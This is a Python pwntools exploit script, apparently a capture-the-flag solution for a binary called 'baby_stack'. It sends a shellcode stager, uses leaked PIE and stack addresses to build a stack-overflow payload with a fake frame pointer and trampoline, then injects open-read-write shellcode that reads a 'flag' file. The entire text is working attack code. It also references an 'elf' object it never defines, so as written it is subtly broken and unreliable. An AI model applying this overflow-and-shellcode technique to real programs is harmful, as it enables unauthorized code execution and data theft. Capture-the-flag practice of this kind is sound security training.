from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./baby_stack')
stager = asm("""
    pop rsi
    pop rdx
    xor rdi, rdi
    xor rax, rax
    syscall
    """)
p.sendafter(b"2025!", stager.ljust(16, b'\x90'))
p.recvuntil(b"GIFT?\n")
leak_main = u64(p.recv(6).ljust(8, b'\x00'))
elf.address = leak_main - 0x184f
print(f"[*] PIE Base: {hex(elf.address)}")
p.recv(1)
leak_stack = u64(p.recv(6).ljust(8, b'\x00'))
print(f"[*] Stack Leak: {hex(leak_stack)}")
buffer_addr = leak_stack - 0xe8 
trampoline = elf.address + 0x189b
target_stager = 0x114514000
fake_rbp = buffer_addr   
payload_head = flat([
    b'A' * 8,         
    target_stager,    
    target_stager + 0x10,    
    0x1000       
    ])
payload = payload_head.ljust(264, b'A')
payload += b'A' * 8 
payload += p64(fake_rbp) 
payload += p64(trampoline) 
p.sendline(payload)
sleep(0.5)
orw = asm(
    shellcraft.open("flag") + 
    shellcraft.read('rax', 'rsp', 0x100) + 
    shellcraft.write(1, 'rsp', 0x100)
    )
p.send(orw)
p.interactive()